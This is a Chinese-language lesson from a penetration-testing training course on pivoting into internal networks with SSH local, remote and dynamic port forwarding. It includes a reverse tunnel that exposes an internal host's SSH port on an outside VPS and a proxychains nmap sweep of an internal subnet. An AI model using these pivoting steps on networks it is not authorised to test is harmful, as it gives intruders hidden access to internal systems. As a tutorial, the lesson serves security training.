---
title: Day063：内网渗透 - SSH 隧道与端口转发
tags:
  - 网络安全
  - 渗透测试
  - 内网渗透
categories:
  - 90天安全突击
stage: 实战演练
abbrlink: 15430
date: 2026-01-28
updated: 2026-01-28
---

# Day063：内网渗透 - SSH 隧道与端口转发

## 📋 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 🏆 实战演练（第三阶段） |
| **所属周次** | Week 11-12：内网渗透基础 |
| **今日主题** | SSH 隧道与端口转发 |
| **预计时间** | 3 小时 |
| **难度等级** | ⭐⭐⭐ 中级 |

---

## 🔥 今日痛点场景

> **场景**：你拿到了跳板机的 SSH 权限，但内网有一台数据库服务器只监听 127.0.0.1:3306，无法从外部直接访问。
>
> **问题**：如何让你的攻击机能够连接这个「只监听本地」的数据库？
>
> **今天的任务**：利用 SSH 隧道进行端口转发，打通访问路径。

---

## 🎯 今日目标

完成今天的学习后，你应该能够：

- [ ] 理解 SSH 本地转发（-L）的原理和用法
- [ ] 理解 SSH 远程转发（-R）的原理和用法
- [ ] 使用 SSH 动态转发（-D）建立 socks 代理
- [ ] 判断何时该用哪种转发方式

**闯关条件**：通过 SSH 隧道成功连接内网数据库，执行 SQL 查询。

---

## ⚔️ 实战任务（先动手！）

> 💡 **原则**：先做再说，遇到问题再查资料。

### 任务 1：SSH 本地转发 - 访问内网服务（30 分钟）

**场景**：内网 MySQL 只监听 127.0.0.1:3306

**命令格式**：
```bash
ssh -L [本地端口]:[目标地址]:[目标端口] [跳板机用户]@[跳板机IP]
```

**实战操作**：
```bash
# 在 Kali 上执行
ssh -L 3306:127.0.0.1:3306 root@192.168.1.50

# 或者映射到不同本地端口避免冲突
ssh -L 13306:127.0.0.1:3306 root@192.168.1.50
```

**验证连接**：
```bash
# 新开一个终端
mysql -h 127.0.0.1 -P 13306 -u root -p
```

**预期结果**：成功连接到内网 MySQL 数据库。

---

### 任务 2：SSH 本地转发 - 访问内网其他机器（20 分钟）

**场景**：内网有一台 Web 服务器 10.0.0.100:80

```bash
# 通过跳板机访问内网 Web
ssh -L 8080:10.0.0.100:80 root@192.168.1.50

# 在浏览器访问
# http://127.0.0.1:8080
```

**预期结果**：能在本地浏览器访问内网 Web 页面。

---

### 任务 3：SSH 远程转发 - 让内网机器主动连出来（30 分钟）

**场景**：你在公网有一台 VPS，内网机器可以出网但不能被访问

**命令格式**：
```bash
ssh -R [远程端口]:[本地地址]:[本地端口] [VPS用户]@[VPS_IP]
```

**实战操作**（在内网机器上执行）：
```bash
# 将内网机器的 22 端口映射到 VPS 的 2222 端口
ssh -R 2222:127.0.0.1:22 root@your-vps.com
```

**在 VPS 上连接内网机器**：
```bash
ssh -p 2222 root@127.0.0.1
```

**预期结果**：从 VPS 可以 SSH 连接到内网机器。

---

### 任务 4：SSH 动态转发 - 建立 SOCKS 代理（30 分钟）

**场景**：需要访问内网多个服务，不想一个个做端口转发

```bash
# 建立动态转发（SOCKS5 代理）
ssh -D 1080 root@192.168.1.50

# 配置 proxychains
# /etc/proxychains4.conf
socks5 127.0.0.1 1080

# 通过代理访问内网任意服务
proxychains4 nmap -sT -Pn 10.0.0.0/24 -p 80,443,3389
proxychains4 curl http://10.0.0.100/
```

**预期结果**：能够通过 SOCKS 代理访问内网任意资源。

---

### 任务 5：实战技巧 - 后台运行与保持连接（15 分钟）

```bash
# 后台运行 SSH 隧道
ssh -fNL 8080:10.0.0.100:80 root@192.168.1.50
# -f: 后台运行
# -N: 不执行远程命令（只做端口转发）

# 保持连接活跃（防止超时断开）
ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -D 1080 root@192.168.1.50

# 查看后台 SSH 进程
ps aux | grep ssh

# 结束后台隧道
kill <PID>
```

---

## ✅ 今日闯关检查

| 检查项 | 状态 |
|--------|------|
| 本地转发成功（-L） | ⬜ |
| 远程转发成功（-R） | ⬜ |
| 动态转发成功（-D） | ⬜ |
| 理解三种转发的区别 | ⬜ |
| 能判断何时用哪种 | ⬜ |

**全部打勾 = Day 63 通关！**

---

## 📖 底层补课（做完实验再看）

### 三种 SSH 转发对比

```
┌─────────────────────────────────────────────────────────────┐
│ 本地转发 (-L)：把远程端口「拉」到本地                         │
│                                                              │
│  [本地:8080] ←────SSH隧道────→ [跳板机] ───→ [内网:80]       │
│       ↑                                                      │
│   本地访问这里                                                │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ 远程转发 (-R)：把本地端口「推」到远程                         │
│                                                              │
│  [内网机器:22] ───→ [VPS:2222] ←────其他人从这里连           │
│                          ↑                                   │
│                     SSH隧道                                  │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ 动态转发 (-D)：SOCKS 代理，访问任意目标                      │
│                                                              │
│  [本地:1080] ←─SOCKS5─→ [跳板机] ───→ [任意内网目标]        │
└─────────────────────────────────────────────────────────────┘
```

### 选择指南

| 场景 | 推荐方式 |
|------|----------|
| 访问内网单个服务 | 本地转发 -L |
| 让内网机器暴露出来 | 远程转发 -R |
| 访问内网多个服务 | 动态转发 -D |
| 需要复杂代理规则 | frp / chisel |

---

## ⚠️ 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 端口被占用 | bind: Address already in use | 换一个本地端口 |
| 隧道断开 | 连接超时中断 | 加 ServerAliveInterval 参数 |
| 远程转发不生效 | 连接被拒绝 | 检查 sshd_config 中 GatewayPorts 设置 |
| 权限不足 | 无法绑定 1024 以下端口 | 用 1024 以上端口或 sudo |
| DNS 不走代理 | 能访问 IP 不能访问域名 | proxychains 开启 proxy_dns |

---

## 💡 知识卡片速查

### SSH 隧道命令速查

| 参数 | 作用 | 示例 |
|------|------|------|
| `-L` | 本地转发 | `-L 8080:10.0.0.1:80` |
| `-R` | 远程转发 | `-R 2222:127.0.0.1:22` |
| `-D` | 动态转发 | `-D 1080` |
| `-f` | 后台运行 | `-fN` |
| `-N` | 不执行命令 | 只做端口转发 |
| `-g` | 允许远程连接 | 配合 -L 使用 |

### SSH vs frp 对比

| 特性 | SSH 隧道 | frp |
|------|----------|-----|
| 依赖 | 系统自带 | 需要额外部署 |
| 配置 | 命令行参数 | 配置文件 |
| 功能 | 基础隧道 | 更丰富 |
| 适用场景 | 临时隧道 | 长期稳定 |

---

## ❓ 常见问题

**Q1：-L 和 -R 容易混淆怎么办？**

A1：记住口诀：-L 是「拉」（把远程拉到本地），-R 是「推」（把本地推到远程）。

**Q2：远程转发后，其他机器连不上？**

A2：默认只监听 127.0.0.1，需要在 sshd_config 设置 `GatewayPorts yes`，并重启 sshd。

**Q3：动态转发和普通 SOCKS 代理有什么区别？**

A3：没有本质区别，SSH -D 就是在跳板机上创建了一个 SOCKS5 代理服务。

---

## 🚀 明日预告

**Day 064：chisel 隧道 - HTTP 协议隧道**

明天你将：
- 使用 chisel 建立 HTTP 隧道
- 绕过只允许 80/443 端口的防火墙
- 对比 chisel 和 frp/SSH 的优劣

---

## 📊 学习记录（学习者填写）

| 项目 | 内容 |
|------|------|
| 实际学习日期 | ____年__月__日 |
| 实际用时 | ____ 小时 |
| 遇到的问题 | |
| 解决方法 | |
| 今日收获 | |
| 自评分数 | ⭐⭐⭐⭐⭐ (1-5星) |

---

> 💬 **导师点评**：
>
> SSH 隧道是最「优雅」的隧道方案，系统自带，不需要额外工具。
>
> 三种转发方式要烂熟于心：-L 拉，-R 推，-D 全能代理。
>
> 但 SSH 也有局限：需要 22 端口可达、需要有效凭据。实战中经常和 frp、chisel 配合使用。

```bash
echo "Day 063 Complete! SSH 隧道掌握！"
```
